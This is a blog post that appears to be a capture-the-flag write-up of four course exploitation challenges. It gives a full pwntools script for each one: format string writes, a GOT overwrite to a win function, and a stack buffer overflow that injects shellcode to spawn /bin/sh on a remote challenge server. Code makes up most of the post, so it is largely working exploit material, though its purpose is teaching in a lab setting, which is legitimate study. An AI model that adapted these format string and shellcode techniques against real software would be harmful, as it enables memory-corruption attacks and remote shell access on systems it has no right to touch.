---
title: "%X%x**ASLR**%x%X"
date: "2020-07-05 16:10:31.582772"
description: "Exploiting format string vulnerabilites, but with ASLR turned on this time"
categories: ["code"]
---

## door

---

FLAG{REDACTED}

---

_A pretty simple fmt string exploit. I'm not too sure why the secret phrase to the door is **APES** though._

How to do it?

1. Write 4 bytes onto the stack, specifically, the 2nd position on the stack.
2. There is an if statement which compares a variable (with value '9447') with 'APES'. Now, if I edit the variable, I can get past the if.
3. 1 byte of padding: `b'A'` makes perfect

Here's some points I realized once I had completed it

1. Pushing all addresses onto the stack is a great idea, which would then mean I can access addresses on the stack contiguously (unlike the way I did here)

```
#!/usr/bin/python3

from pwn import *

#p = process('./door')
p = remote('plsdonthaq.me', 4001)

p.readuntil('way at ')
ptr = int(p.readuntil('\n', drop=True), 16)
ptr1 = p32(ptr)
ptr2 = p32(ptr + 1)
ptr3 = p32(ptr + 2)
ptr4 = p32(ptr + 3)

l1 = ptr1 + b'%60x%2$n' + ptr1 + ptr2 + b'       %6$n ' + ptr3 + ptr4 + b'%236x%10$n%14x%11$n'

p.sendline(b'A' + l1)
p.interactive()
```

## snake

---

FLAG{REDACTED}

---

_ASLR? PIE? Fear not, for Buffer overflows, and shellcode are here to the rescue_

1. Like the challenges from previous weeks, the idea was to pop a shell using shellcode and a buffer overflow.
2. The only kink in the process, was that we couldn't simply look at the disassembly to find the address of the buffer.
3. In that case, all we needed was to leak an address on the stack, because the offset to the buffer from a value on the stack would be predictable.
4. The pointer comes in the form of debugging information leaked when the password length is greated than the size of the buffer (0x50)

How the code works:

1. Leak an address by entering excess characters into the password field.
2. Put shellcode to pop a shell in the buffer. Pad with nops.
   1. The size of the buffer is roughly 0x16 bytes, but there are 0x36 bytes until the return address is overwritten. Free real estate!
3. Figuring out the offset to a position in the buffer (0x9e), we overwrite the return address with the calculated address to somewhere in our buffer
4. ???
5. Profit

```
#!/usr/bin/python3

from pwn import *

#p = process('./snake')
p = remote('plsdonthaq.me', 4002)

p.sendlineafter('> ', '3')
p.sendlineafter('passwd:', 'A'*0x50)

p.readuntil('offset ')
ptr = int(p.readuntil('\n', drop=True).decode(), 16)

# chuck a shell
code = asm('''

sub esp, 0x50

push 0
push {}
push {}

mov eax, 0xb
mov ebx, esp
mov ecx, 0
mov edx, 0
mov esi, 0

int 0x80

'''.format(u32('//sh'), u32('/bin')))

nops = asm('nop') * (0x36 - len(code))
ret = ptr - 0x9e

p.sendlineafter('> ', '1')
p.sendline(nops + code + p32(ret))

p.interactive()
```

## formatrix

---

FLAG{REDACTED}

---

_You can tell I did this one after Friday's tutorial_

Having opened the door to format strings, we now face the GOTacle. Can we overcome this!? _(I haven't watched the movie either)_

1. Pretty standard format string exploit: put an address onto the stack, write to it. Change the code flow.
2. Only difference? The address to overwrite is of the printf function which is dynamically decided on from the got. With no RELRO, this is tRiViaL.

How does this code work?

1. Graduating from the one liner almost unreadable code, I wrote up a function to write the address of the win function into the GOT.
2. Both the addresses of the GOT and win function can be obtained from the disassembly, since PIE is not enabled.

```
#!/usr/bin/python3

from pwn import *

#p = process('./formatrix')
p = remote('plsdonthaq.me', 4003)

got = 0x8049c18
win = 0x8048536

def writeAddress(where, what):
	win = p32(what)
	payload = b''
	payload += p32(where)
	payload += p32(where + 1)
	payload += p32(where + 2)
	payload += p32(where + 3)

	for i in range(4):
		ind = 3 - i
		byte = win[ind]
		count = ((byte - 16) + 256) % 256
		payload += f'%{count}x'.encode()
		payload += f'%{ind + 3}$hhn'.encode()
		if (i != 3):
			payload += f'%{256 - count}x'.encode()

	return payload

p.sendlineafter('You say: ', writeAddress(got, win))

p.interactive()
```

## sploitwarz

---

FLAG{REDACTED}

---

_Remember two challenges ago when Adam said he wouldn't make a complete game for a challenge? Well he was lying_

Combining my knowledge from the last two exploits, I write the address of the win function to the printf function in the global offset table after leaking an address exploiting a fmt string vulnerability.

How does this code work?

1. There's the function from formatrix that writes addresses to places in memory. Only it has been improved to take in the offset from the top of the stack
2. Going through the binary, I find that only one printf in the game is vulnerable to format string exploit. In `do_gamble` function where it prints out the user's name on winning the gamble.
3. Exploring the game, I find that the address of the GOT is the 149th element on the stack (Note, I don't need to select this one, there are other addresses at shallower depths, but why not). This makes the exploit (or my game name) `%x|`. The pipe is for easier extraction.
4. Winning the gamble
   1. Finding and editing the correct choice seems very hard without leaking data before, and getting the correct choice is the way to leak data. Infinite loop?
   2. Brute force is the best force. Since the gamble lets me spend 0.0000001 (basically a very low number) of btc, the odds of winning are very pretty good. Plus I think the odds favor the higher numbers, but I don't worry about it too much.
5. Once We are at the printf that leaks information, we can obtain the address of the GOT from it. Then calculate the address of the win function to use. Finally using the function from (1) to generate the payload.
6. Set the name as the new payload by changing the user's handle.
7. To execute the new payload, you need to win the gamble again, so bruteforce!
8. `cat flag`

Things to think about/Issues faced:

1. Finding the exploit: Unlike the last exploits, the entered text is not reflected back immediately, and there are some time and steps between the payload is entered and it takes effect. I took a while figuring this one out.
2. Reading/Writing: Because I read in so much data, (perhaps issues in buffering or the game) cause the output to be printed out multiple times. I fixed this one by cleaning the buffer regularly, which would remove any data that was not read in.

```
#!/usr/bin/python3
from pwn import *

def writeAddress(offset, where, what):
	win = p32(what)
	payload = b''
	payload += p32(where)
	payload += p32(where + 1)
	payload += p32(where + 2)
	payload += p32(where + 3)
	for i in range(4):
		ind = 3 - i
		byte = win[ind]
		count = ((byte - 16) + 256) % 256
		payload += f'%{count}x'.encode()
		payload += f'%{ind + offset}$hhn'.encode()
		if (i != 3):
			payload += f'%{256 - count}x'.encode()
	return payload

#p = process('./sploitwarz')
p = remote('plsdonthaq.me', 4004)

payload = b'%149$x|'
p.readuntil('handle?')
p.sendlineafter('> ', payload)

# brute force the gamble
nline=''
while(True):
	p.clean()
	p.sendlineafter('What will you do? ', 'g')
	p.sendline('0.0000001')
	p.sendlineafter('> ', '5')
	f = p.readline().decode()
	if ('OPTIONS' in f):
		continue
	nline = p.readline().decode()
	if ('Well done' in nline):
		# next line contains leakage
		break
	p.readuntil('any key')
	p.sendlineafter('continue...', '\n')

r = nline.split('|')
got = int('0x' + r[0].split(' ')[-1], 16)
win = got - 10852
got = got + 0x10

p.clean()
p.sendline('\n')

p.clean()
# dummy input
p.sendline('c')

p.clean()
p.sendline('c')
p.sendline(writeAddress(5, got, win))

# exploit
nline=''
while(True):
	p.sendlineafter('What will you do? ', 'g')
	p.sendlineafter(': ', '0.0000001')
	p.sendlineafter('> ', '5')
	f = p.readline()
	if (not p.can_read()):
		break
	nline = p.readline()
	if (b'Well done' in nline):
		break
	p.clean()
	p.sendline('\n')

p.interactive()
```

---
